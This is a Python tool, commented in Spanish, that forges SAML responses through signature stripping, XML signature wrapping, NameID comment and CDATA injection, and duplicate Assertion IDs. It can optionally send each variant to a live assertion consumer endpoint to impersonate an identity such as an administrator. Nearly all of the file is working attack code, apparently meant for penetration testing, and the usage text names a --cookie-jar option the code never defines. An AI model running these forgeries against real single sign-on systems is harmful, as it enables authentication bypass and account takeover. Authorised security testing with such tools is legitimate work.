#!/usr/bin/env python3
"""
saml_xsw_generator.py

Genera variantes de ataque sobre un SAMLResponse capturado (signature stripping,
XSW genérico, comment/CDATA injection en NameID, duplicate Assertion ID) y,
opcionalmente, las dispara contra un endpoint ACS para diffear contra un baseline.

Las variantes "xsw_sibling" y "xsw_extensions" son aproximaciones genéricas al
concepto XSW (mover/duplicar la Assertion firmada para que el parser valide una
cosa y procese otra). NO son una implementación byte-exacta del taxonomy
oficial XSW1-8 (Somorovsky et al.) — para eso, usar SAMLRaider como referencia.
Estas variantes cubren el mecanismo central y en la práctica pegan contra una
buena parte de implementaciones vulnerables, pero si una no funciona no
descarta la clase de bug: probar las 8 oficiales vía SAMLRaider antes de
concluir que el SP es robusto.

Requiere: lxml, requests (pip install lxml requests)

Uso:
    # Solo generar variantes a partir de un SAMLResponse capturado (base64)
    python3 saml_xsw_generator.py --input response_b64.txt --outdir variants/

    # Generar y además disparar contra el ACS, diffeando contra baseline
    python3 saml_xsw_generator.py --input response_b64.txt --outdir variants/ \\
        --target https://sp.example.com/saml/acs --cookie-jar baseline_cookies.txt \\
        --impersonate-nameid admin@example.com
"""

import argparse
import base64
import copy
import sys
import uuid
from pathlib import Path

from lxml import etree

NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}


def load_samlresponse(path: str) -> etree._Element:
    """Lee un SAMLResponse base64 (desde archivo o stdin) y lo parsea como XML."""
    raw = Path(path).read_text().strip()
    xml_bytes = base64.b64decode(raw)
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    return etree.fromstring(xml_bytes, parser=parser)


def find_assertion(root: etree._Element) -> etree._Element:
    assertion = root.find(".//saml:Assertion", namespaces=NSMAP)
    if assertion is None:
        raise ValueError("No se encontró <saml:Assertion> en el documento. ¿Es un SAMLResponse válido?")
    return assertion


def find_signature(node: etree._Element) -> etree._Element | None:
    return node.find(".//ds:Signature", namespaces=NSMAP)


def find_nameid(node: etree._Element) -> etree._Element | None:
    return node.find(".//saml:NameID", namespaces=NSMAP)


def serialize(root: etree._Element) -> bytes:
    return etree.tostring(root, xml_declaration=True, encoding="UTF-8")


def to_b64(xml_bytes: bytes) -> str:
    return base64.b64encode(xml_bytes).decode()


# ---------------------------------------------------------------------------
# Variantes
# ---------------------------------------------------------------------------

def variant_signature_stripping(root: etree._Element) -> etree._Element:
    """Elimina toda firma del documento. Prueba si el SP valida algo en absoluto."""
    doc = copy.deepcopy(root)
    for sig in doc.findall(".//ds:Signature", namespaces=NSMAP):
        sig.getparent().remove(sig)
    return doc


def variant_xsw_sibling(root: etree._Element, new_nameid: str | None) -> etree._Element:
    """
    Clona la Assertion firmada, altera el clon (NameID), y lo inserta como
    PRIMER hijo de <Response>, dejando el original firmado como segundo hijo.
    Objetivo: que un parser ingenuo valide la firma de la 2da pero la lógica
    de negocio procese la 1ra (la alterada).
    """
    doc = copy.deepcopy(root)
    original_assertion = find_assertion(doc)
    forged = copy.deepcopy(original_assertion)

    nameid = find_nameid(forged)
    if nameid is not None and new_nameid:
        nameid.text = new_nameid

    # Le sacamos la firma al clon forjado (no la necesita, es el que NO se valida)
    forged_sig = find_signature(forged)
    if forged_sig is not None:
        forged_sig.getparent().remove(forged_sig)

    # Le damos un ID propio para no colisionar
    if forged.get("ID"):
        forged.set("ID", f"_forged-{uuid.uuid4()}")

    original_assertion.addprevious(forged)
    return doc


def variant_xsw_extensions(root: etree._Element, new_nameid: str | None) -> etree._Element:
    """
    Mueve la Assertion original firmada DENTRO de un <Extensions> de una
    Assertion forjada nueva. Cubre SPs que sí buscan "la Assertion con firma"
    pero la encuentran en un lugar inesperado del árbol.
    """
    doc = copy.deepcopy(root)
    response = doc  # root ES el Response en un SAMLResponse típico
    original_assertion = find_assertion(response)
    parent = original_assertion.getparent()

    forged = copy.deepcopy(original_assertion)
    nameid = find_nameid(forged)
    if nameid is not None and new_nameid:
        nameid.text = new_nameid
    forged_sig = find_signature(forged)
    if forged_sig is not None:
        forged_sig.getparent().remove(forged_sig)
    if forged.get("ID"):
        forged.set("ID", f"_forged-{uuid.uuid4()}")

    extensions = etree.SubElement(forged, "{%s}Extensions" % NSMAP["samlp"])

    # Sacamos la original del árbol principal y la metemos adentro de Extensions
    parent.remove(original_assertion)
    extensions.append(original_assertion)

    parent.append(forged)
    return doc


def variant_nameid_comment_injection(root: etree._Element, impersonate_local: str, real_domain: str) -> etree._Element:
    """
    <NameID>admin<!---->@evil.com</NameID> — el parser XML concatena el texto
    ignorando el comentario interno (queda "admin@evil.com" para XML), pero
    algunas implementaciones que hacen split/regex sobre el texto crudo antes
    de que el parser normalice pueden leer solo "admin".
    """
    doc = copy.deepcopy(root)
    nameid = find_nameid(doc)
    if nameid is None:
        raise ValueError("No hay NameID para inyectar.")
    nameid.text = None
    nameid.append(etree.Comment(""))
    # Reconstruimos manualmente: texto - comentario - resto de texto
    nameid.text = impersonate_local
    comment = etree.Comment("")
    nameid.append(comment)
    comment.tail = f"@{real_domain}"
    return doc


def variant_nameid_cdata_injection(root: etree._Element, new_value: str) -> etree._Element:
    """Reemplaza el NameID por un bloque CDATA — algunos parsers lo tratan distinto al texto plano."""
    doc = copy.deepcopy(root)
    nameid = find_nameid(doc)
    if nameid is None:
        raise ValueError("No hay NameID para inyectar.")
    for child in list(nameid):
        nameid.remove(child)
    nameid.text = etree.CDATA(new_value)
    return doc


def variant_duplicate_assertion_id(root: etree._Element, new_nameid: str | None) -> etree._Element:
    """
    Dos Assertions con el MISMO ID: la original firmada + un clon alterado
    con idéntico atributo ID. Confunde libs que resuelven la referencia de
    firma (#AssertionID) buscando por ID sin verificar unicidad/posición.
    """
    doc = copy.deepcopy(root)
    original_assertion = find_assertion(doc)
    original_id = original_assertion.get("ID")

    forged = copy.deepcopy(original_assertion)
    nameid = find_nameid(forged)
    if nameid is not None and new_nameid:
        nameid.text = new_nameid
    forged_sig = find_signature(forged)
    if forged_sig is not None:
        forged_sig.getparent().remove(forged_sig)
    if original_id:
        forged.set("ID", original_id)  # mismo ID a propósito

    original_assertion.addprevious(forged)
    return doc


VARIANTS = {
    "signature_stripping": lambda root, args: variant_signature_stripping(root),
    "xsw_sibling": lambda root, args: variant_xsw_sibling(root, args.impersonate_nameid),
    "xsw_extensions": lambda root, args: variant_xsw_extensions(root, args.impersonate_nameid),
    "duplicate_assertion_id": lambda root, args: variant_duplicate_assertion_id(root, args.impersonate_nameid),
    "nameid_cdata": lambda root, args: variant_nameid_cdata_injection(
        root, args.impersonate_nameid or "admin"
    ),
}


def maybe_comment_variant(root: etree._Element, args) -> etree._Element | None:
    if not args.impersonate_nameid or "@" not in args.impersonate_nameid:
        return None
    local, domain = args.impersonate_nameid.split("@", 1)
    # usamos el dominio REAL que ya está en el NameID original como cobertura
    real_nameid = find_nameid(root)
    real_domain = real_nameid.text.split("@", 1)[1] if real_nameid is not None and "@" in (real_nameid.text or "") else domain
    return variant_nameid_comment_injection(root, local, real_domain)


# ---------------------------------------------------------------------------
# Replay / diffing opcional
# ---------------------------------------------------------------------------

def send_variant(target: str, samlresponse_b64: str, relay_state: str | None, cookie_jar_path: str | None):
    import requests

    session = requests.Session()
    data = {"SAMLResponse": samlresponse_b64}
    if relay_state:
        data["RelayState"] = relay_state

    resp = session.post(target, data=data, allow_redirects=False, timeout=15)
    set_cookie = resp.headers.get("Set-Cookie", "")
    return {
        "status": resp.status_code,
        "len": len(resp.content),
        "location": resp.headers.get("Location", ""),
        "set_cookie": set_cookie,
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--input", required=True, help="Archivo con el SAMLResponse en base64 (tal cual se capturó)")
    ap.add_argument("--outdir", default="saml_variants", help="Carpeta de salida para las variantes generadas")
    ap.add_argument("--impersonate-nameid", default=None, help="Valor de NameID a inyectar en las variantes (ej admin@target.com)")
    ap.add_argument("--target", default=None, help="URL del ACS para disparar cada variante automáticamente")
    ap.add_argument("--relay-state", default=None, help="RelayState a enviar junto al SAMLResponse (si aplica)")
    ap.add_argument("--only", default=None, help="Nombre de una sola variante a generar (ver VARIANTS)")
    args = ap.parse_args()

    root = load_samlresponse(args.input)
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    results = []

    variants_to_run = {args.only: VARIANTS[args.only]} if args.only else dict(VARIANTS)

    for name, fn in variants_to_run.items():
        try:
            variant_root = fn(root, args)
        except ValueError as e:
            print(f"[skip] {name}: {e}", file=sys.stderr)
            continue

        xml_bytes = serialize(variant_root)
        b64 = to_b64(xml_bytes)

        (outdir / f"{name}.xml").write_bytes(xml_bytes)
        (outdir / f"{name}.b64.txt").write_text(b64)
        print(f"[ok] {name} -> {outdir / (name + '.xml')}")

        if args.target:
            result = send_variant(args.target, b64, args.relay_state, None)
            results.append({"variant": name, **result})
            print(f"      status={result['status']} len={result['len']} set_cookie={'YES' if result['set_cookie'] else 'no'}")

    # Variante de comment injection, condicional a que haya NameID con @
    comment_variant = maybe_comment_variant(root, args)
    if comment_variant is not None:
        xml_bytes = serialize(comment_variant)
        b64 = to_b64(xml_bytes)
        (outdir / "nameid_comment.xml").write_bytes(xml_bytes)
        (outdir / "nameid_comment.b64.txt").write_text(b64)
        print(f"[ok] nameid_comment -> {outdir / 'nameid_comment.xml'}")
        if args.target:
            result = send_variant(args.target, b64, args.relay_state, None)
            results.append({"variant": "nameid_comment", **result})
            print(f"      status={result['status']} len={result['len']} set_cookie={'YES' if result['set_cookie'] else 'no'}")

    if args.target and results:
        print("\n--- Resumen (diffear contra tu baseline manualmente) ---")
        for r in results:
            print(r)


if __name__ == "__main__":
    main()
